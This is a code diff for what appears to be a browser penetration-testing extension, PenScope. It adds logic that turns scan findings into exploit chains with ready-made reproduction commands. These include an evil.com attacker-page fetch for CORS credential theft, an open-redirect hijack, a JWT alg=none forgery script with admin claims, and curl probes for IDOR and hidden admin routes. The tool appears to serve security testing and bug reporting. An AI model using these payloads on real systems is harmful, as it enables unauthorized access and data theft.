+        reproCmd:`# Original:\ncurl "${baseUrl}${r.path||"/api/resource/"+r.originalId}" ${cookieFlag}\n# Tested (different user/resource):\ncurl "${baseUrl}${(r.path||"").replace(r.originalId,r.testedId)}" ${cookieFlag}`,
+        nextSteps:["Enumerate across a larger ID range","Verify the returned data belongs to a different user","Check if write operations are also IDOR-able","Document 3+ examples for the report"],
+        confidence:0.92
+      });
+    }
+  });
+
+  // === Chain 6: CORS reflection with credentials ===
+  const cors=(tab.probeData?.corsResults||[]).filter(c=>c.severity==="critical"||c.reflected);
+  cors.forEach(c=>{
+    if(c.acac==="true"&&c.reflected){
+      chains.push({
+        id:`chain-cors-credential-${chains.length}`,
+        severity:"critical",
+        title:`Full CORS bypass: ${c.path} reflects arbitrary origins WITH credentials`,
+        summary:`The endpoint reflected origin "${c.origin}" in Access-Control-Allow-Origin AND returned Access-Control-Allow-Credentials: true. Any origin can read authenticated responses — this is a total SOP bypass for cross-origin data theft.`,
+        findings:[{type:"cors",data:c}],
+        reproCmd:`<!-- PoC — attacker page at https://evil.com -->\nfetch("${baseUrl}${c.path}",{credentials:"include"}).then(r=>r.text()).then(console.log)`,
+        nextSteps:["Confirm which response data is exposed","Test with a user's real browser session","Document the attacker-page PoC"],
+        confidence:0.98
+      });
+    }
+  });
+
+  // === Chain 7: Open Redirect on an auth flow path ===
+  const openRedir=(tab.probeData?.openRedirects||[]);
+  openRedir.forEach(r=>{
+    if(/\/(oauth|login|auth|callback|signin|saml|sso)/i.test(r.path||"")){
+      chains.push({
+        id:`chain-redir-auth-${chains.length}`,
+        severity:"high",
+        title:`Open redirect on auth flow: ${r.path}`,
+        summary:`Parameter ${r.param} on an auth-related path redirects to attacker-controlled URLs. Combined with an OAuth-style flow, this is a token theft vector: attacker sends user to /oauth/authorize?...&redirect_uri=evil.com and captures the code/token.`,
+        findings:[{type:"open-redirect",data:r}],
+        reproCmd:`# Click-to-hijack:\ncurl -i "${baseUrl}${r.path}?${r.param}=https://evil.com"`,
+        nextSteps:["Check if this is inside an OAuth code/token flow","Test with encoded variants (//evil.com, https:\\evil.com)","Craft the full OAuth hijack PoC if applicable"],
+        confidence:0.85
+      });
+    }
+  });
+
+  // === Chain 8: Hidden admin route discovered in code but not observed ===
+  const hiddenAdmin=(tab.discoveredRoutes||[]).filter(r=>!r.observed&&!r.isNoise&&/admin|backoffice|manage|controlpanel|superuser|moderator|sudo/i.test(r.path||""));
+  if(hiddenAdmin.length>=3){
+    chains.push({
+      id:`chain-hidden-admin-${chains.length}`,
+      severity:"high",
+      title:`${hiddenAdmin.length} admin routes in code but never called`,
+      summary:`These paths are referenced in the JavaScript bundle or source maps but were never requested during your session. They're likely gated by client-side role checks — try calling them directly and see if the server enforces authorization.`,
+      findings:hiddenAdmin.slice(0,10).map(r=>({type:"hidden-route",path:r.path,data:r})),
+      reproCmd:hiddenAdmin.slice(0,5).map(r=>`curl "${baseUrl}${r.path}" ${cookieFlag}`).join("\n"),
+      nextSteps:["Try GET on each","For 200s, escalate to OPTIONS/POST/PUT","Check if response differs from the unauth version","Look for role-check bypass via X-User-Role header tricks"],
+      confidence:0.7
+    });
+  }
+
+  // === Chain 9: JWT alg=none accepted ===
+  const jwtNone=(tab.probeData?.jwtAlgResults||[]).filter(r=>r.accepted);
+  if(jwtNone.length){
+    chains.push({
+      id:`chain-jwt-none-${chains.length}`,
+      severity:"critical",
+      title:`JWT forgery possible: server accepts alg=none`,
+      summary:`PenScope substituted the cookie JWT's algorithm with "none" and dropped the signature — the server still returned ${jwtNone[0].noneStatus}. This means you can forge arbitrary JWTs with any claims (role:admin, user_id:1, etc.) and the server will trust them.`,
+      findings:[{type:"jwt-forgery",data:jwtNone[0]}],
+      reproCmd:`# Build a JWT with custom claims:\nheader=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')\npayload=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')\ntoken="\${header}.\${payload}."\ncurl -H "Authorization: Bearer $token" "${baseUrl}/api/me"`,
+      nextSteps:["Craft a JWT with elevated role claims","Confirm admin endpoints accept it","Report as JWT forgery vulnerability"],
+      confidence:0.98
+    });
+  }
+
+  // === Chain 10: Source map leaked secrets + matching endpoint ===
+  const smSecrets=(tab.parsedSourceMaps||[]).flatMap(sm=>(sm.secrets||[]).map(s=>({...s,smUrl:sm.url})));
+  if(smSecrets.length){
+    chains.push({
+      id:`chain-sourcemap-secret-${chains.length}`,
+      severity:"high",
+      title:`${smSecrets.length} secrets leaked in source maps`,
+      summary:`The production build is shipping source maps that contain hardcoded secrets. These are recoverable by anyone who downloads the site's .map files. Even if the secrets are revoked, this indicates a CI/CD misconfiguration: source maps should never be deployed to production.`,
+      findings:smSecrets.slice(0,10).map(s=>({type:"sourcemap-secret",data:s})),
+      reproCmd:`curl "${smSecrets[0].smUrl||''}"  # the .map file is publicly downloadable`,
+      nextSteps:["Verify each secret is still active","Check if removing .map from the deployment is feasible","Report as information disclosure + configuration issue"],
+      confidence:0.95
+    });
+  }
+
+  // === Chain 11: WebRTC private IP leak + internal subnet ===
+  const privateIPs=(tab.webrtcLeaks||[]).filter(l=>l.type==="private");
+  if(privateIPs.length){
+    chains.push({
+      id:`chain-webrtc-${chains.length}`,
+      severity:"medium",
+      title:`Internal network exposure via WebRTC STUN`,
+      summary:`WebRTC leaked ${privateIPs.length} private IPs (${privateIPs.map(l=>l.ip).join(", ")}) which reveals the internal network topology. Combined with any SSRF or service-discovery vulnerabilities, this gives an attacker a map of what to scan.`,
+      findings:privateIPs.map(l=>({type:"webrtc-leak",data:l})),
+      reproCmd:`// Run in browser console:\nnew RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}).createDataChannel("")`,
+      nextSteps:["Check if the site uses WebRTC features (video chat, screen share)","If not, recommend disabling WebRTC-SDP leakage","Chain with any SSRF finding"],
+      confidence:0.8
+    });
+  }
+
+  // === Chain 12: Recursive probe findings + specific sensitive data ===
+  // Recursive probe state lives at tab.probeData.recursiveProbe (inside the probe result spread),
+  // NOT at tab.recursiveProbeData — there's no separate state field. The v5.9 bug hunt caught
+  // this — chain 12 never fired in v5.9.0 because I referenced the wrong path.
+  const rp=tab.probeData&&tab.probeData.recursiveProbe;
+  const recFindings=((rp&&rp.wave1)||[]).concat((rp&&rp.wave2)||[],(rp&&rp.wave3)||[]).flatMap(r=>(r.findings||[]).map(f=>({...f,path:r.path}))).filter(f=>f.severity==="critical"||f.severity==="high");
+  if(recFindings.length>=3){
+    chains.push({
+      id:`chain-recursive-bulk-${chains.length}`,
+      severity:"high",
+      title:`${recFindings.length} sensitive findings across recursive probe responses`,
+      summary:`The smart recursive probe found sensitive data (auth tokens, PII, internal URLs, etc.) across multiple endpoints. This is systemic — the app is leaking data in API responses that shouldn't be public.`,
+      findings:recFindings.slice(0,10).map(f=>({type:"recursive-finding",data:f})),
+      reproCmd:recFindings.slice(0,3).map(f=>`curl "${baseUrl}${f.path}" ${cookieFlag}`).join("\n"),
+      nextSteps:["Audit each endpoint for the specific data type leaked","Check if responses are cacheable (CDN exposure)","Report as systemic data exposure"],
+      confidence:0.85
+    });
+  }
+
+  // Sort by severity × confidence
+  try{
+    const sevOrder={critical:4,high:3,medium:2,low:1,info:0};
+    chains.sort((a,b)=>{
+      const sa=(sevOrder[a.severity]||0)*(a.confidence||0.5);
+      const sb=(sevOrder[b.severity]||0)*(b.confidence||0.5);
+      return sb-sa;
+    });
+  }catch(e){console.warn('[PenScope] chain sort',e.message||e);}
+  // Cap chain list size before assignment — persistence trim would do this anyway but we
+  // don't want the render to iterate 100+ chains either.
+  tab.exploitChains=chains.slice(0,50);
+}
+
 function runPassiveAnalysis(tabId){
   const tab=T(tabId);
-  decodeAllJWTs(tabId);
-  classifyAndFilterRoutes(tabId);
-  buildPermissionMatrix(tabId);
-  generateIDORTests(tabId);
-  extractGraphQLOps(tabId);
-  buildSymbolTable(tabId);
+  try{decodeAllJWTs(tabId);}catch(e){console.warn('[PenScope] decodeAllJWTs',e.message||e);}
+  try{classifyAndFilterRoutes(tabId);}catch(e){console.warn('[PenScope] classifyAndFilterRoutes',e.message||e);}
+  try{buildPermissionMatrix(tabId);}catch(e){console.warn('[PenScope] buildPermissionMatrix',e.message||e);}
+  try{generateIDORTests(tabId);}catch(e){console.warn('[PenScope] generateIDORTests',e.message||e);}
+  try{extractGraphQLOps(tabId);}catch(e){console.warn('[PenScope] extractGraphQLOps',e.message||e);}
+  try{buildSymbolTable(tabId);}catch(e){console.warn('[PenScope] buildSymbolTable',e.message||e);}
+  try{analyzeExploitChains(tabId);}catch(e){console.warn('[PenScope] analyzeExploitChains',e.message||e);}
   if(_debugTabs.has(tabId)&&!tab._passiveExtracted){
     tab._passiveExtracted=true;
     extractIndexedDB(tabId);
@@ -4551,7 +5099,7 @@ chrome.runtime.onMessage.addListener((msg,sender,sendResponse)=>{
       if(_debugTabs.has(msg.tabId)&&(!d.runtime||!d.runtime.framework)&&!d.runtime?.interestingGlobals?.length)runRuntimeExtraction(msg.tabId);
       // v5.2: Run all passive analysis
       runPassiveAnalysis(msg.tabId);
-      sendResponse({...d,params:Object.values(d.params),endpointMeta:meta,deepEnabled:_debugTabs.has(msg.tabId),methodSuggestions,runtime:d.runtime||{},interceptedRequests:(d.interceptedRequests||[]).slice(-100),networkTiming:d.networkTiming||{},scriptSources:d.scriptSources||[],consoleLogs:d.consoleLogs||[],auditIssues:d.auditIssues||[],executionContexts:d.executionContexts||[],discoveredRoutes:d.discoveredRoutes||[],probeData:d.probeData||null,indexedDBData:d.indexedDBData||[],cacheStorageData:d.cacheStorageData||[],jwtFindings:d.jwtFindings||[],permissionMatrix:d.permissionMatrix||[],idorTests:d.idorTests||[],postBodies:d.postBodies||[],apiResponseBodies:d.apiResponseBodies||[],coverageData:d.coverageData||null,domListeners:d.domListeners||[],shadowDOMData:d.shadowDOMData||[],memoryStrings:d.memoryStrings||[],encodedBlobs:d.encodedBlobs||[],dnsPrefetch:d.dnsPrefetch||[],iframeScan:d.iframeScan||[],headerIntel:d.headerIntel||[],perfEntries:d.perfEntries||[],cssContent:d.cssContent||[],harvestedMaps:d.harvestedMaps||[],realEventListeners:d.realEventListeners||[],httpOnlyCookies:d.httpOnlyCookies||[],responseSchemas:d.responseSchemas||[],heapSecrets:d.heapSecrets||[],parsedSourceMaps:d.parsedSourceMaps||[],grpcEndpoints:d.grpcEndpoints||[],wasmModules:d.wasmModules||[],webrtcLeaks:d.webrtcLeaks||[],broadcastChannels:d.broadcastChannels||[],webAuthnInfo:d.webAuthnInfo||null,compressionResults:d.compressionResults||[],grpcReflection:d.grpcReflection||null,wsHijackResults:d.wsHijackResults||[],cachePoisonProbe:d.cachePoisonProbe||[],timingOracle:d.timingOracle||[],coopCoepInfo:d.coopCoepInfo||null,storagePartition:d.storagePartition||[],webgpuInfo:d.webgpuInfo||null,graphqlOps:d.graphqlOps||[],symbolTable:d.symbolTable||[]});return true;}
+      sendResponse({...d,params:Object.values(d.params),endpointMeta:meta,deepEnabled:_debugTabs.has(msg.tabId),methodSuggestions,runtime:d.runtime||{},interceptedRequests:(d.interceptedRequests||[]).slice(-100),networkTiming:d.networkTiming||{},scriptSources:d.scriptSources||[],consoleLogs:d.consoleLogs||[],auditIssues:d.auditIssues||[],executionContexts:d.executionContexts||[],discoveredRoutes:d.discoveredRoutes||[],probeData:d.probeData||null,indexedDBData:d.indexedDBData||[],cacheStorageData:d.cacheStorageData||[],jwtFindings:d.jwtFindings||[],permissionMatrix:d.permissionMatrix||[],idorTests:d.idorTests||[],postBodies:d.postBodies||[],apiResponseBodies:d.apiResponseBodies||[],coverageData:d.coverageData||null,domListeners:d.domListeners||[],shadowDOMData:d.shadowDOMData||[],memoryStrings:d.memoryStrings||[],encodedBlobs:d.encodedBlobs||[],dnsPrefetch:d.dnsPrefetch||[],iframeScan:d.iframeScan||[],headerIntel:d.headerIntel||[],perfEntries:d.perfEntries||[],cssContent:d.cssContent||[],harvestedMaps:d.harvestedMaps||[],realEventListeners:d.realEventListeners||[],httpOnlyCookies:d.httpOnlyCookies||[],responseSchemas:d.responseSchemas||[],heapSecrets:d.heapSecrets||[],parsedSourceMaps:d.parsedSourceMaps||[],grpcEndpoints:d.grpcEndpoints||[],wasmModules:d.wasmModules||[],webrtcLeaks:d.webrtcLeaks||[],broadcastChannels:d.broadcastChannels||[],webAuthnInfo:d.webAuthnInfo||null,compressionResults:d.compressionResults||[],grpcReflection:d.grpcReflection||null,wsHijackResults:d.wsHijackResults||[],cachePoisonProbe:d.cachePoisonProbe||[],timingOracle:d.timingOracle||[],coopCoepInfo:d.coopCoepInfo||null,storagePartition:d.storagePartition||[],webgpuInfo:d.webgpuInfo||null,graphqlOps:d.graphqlOps||[],symbolTable:d.symbolTable||[],exploitChains:d.exploitChains||[]});return true;}
     case "clearData":{const wasDeep=_debugTabs.has(msg.tabId);delete state[msg.tabId];if(_scripts[msg.tabId])_scripts[msg.tabId]=new Map();Object.keys(_seen).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _pending[k];});if(wasDeep)T(msg.tabId).deepEnabled=true;sendResponse({ok:true});return true;}
     case "reportContentScan":{const tabId=sender.tab?.id;if(tabId){const t=T(tabId);
       // Standard fields
